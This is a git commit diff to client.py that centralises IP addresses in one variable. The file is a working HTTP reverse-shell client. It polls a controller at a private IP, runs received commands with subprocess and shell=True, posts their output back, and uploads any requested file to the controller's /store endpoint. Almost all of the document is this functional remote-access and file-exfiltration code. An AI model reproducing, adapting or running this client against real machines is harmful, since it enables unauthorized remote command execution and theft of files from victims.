a54c4b4d28735e75a52e8c872f734bd9611439ee
Shankara Narayana <shankaranarayana01061997@gmail.com>
2020-09-13 23:31:34 +0530

    Extracted all IP addresses to variable

--- client.py
+++ client.py
@@ -5,9 +5,10 @@ import subprocess
 import time
 import os
 
+IP = '192.168.152.44'
 while True: 
 
-    req = requests.get('http://10.10.10.100')      # Send GET request to host machine
+    req = requests.get('http://'+IP)      # Send GET request to host machine
     command = req.text                             # Store the received txt into command variable
 
     if 'terminate' in command:
@@ -17,16 +18,14 @@ while True:
         grab,path=command.split('*')
 
         if os.path.exists(path):
-            url='http://192.168.158.128/store'   #Append /store in the URL
+            url='http://' +IP +'/store'   #Append /store in the URL
             files = {'file': open(path, 'rb')} # Add a dictionary key where file will be stored
             r=requests.post(url, files=files) # Send the file
             #requests library use POST method called "multipart/form-data"
         else:
-            post_response = requests.post(url='http://10.10.10.100', data='[-] Not able to find the file !' )
+            post_response = requests.post(url='http://' +IP, data='[-] Not able to find the file !' )
     else:
         CMD =  subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
-        post_response = requests.post(url='http://192.168.158.128', data=CMD.stdout.read() ) 
-        post_response = requests.post(url='http://192.168.158.128', data=CMD.stderr.read() )  
+        post_response = requests.post(url='http://'+IP, data=CMD.stdout.read() ) 
+        post_response = requests.post(url='http://'+IP, data=CMD.stderr.read() )  
     time.sleep(3)
-
-    
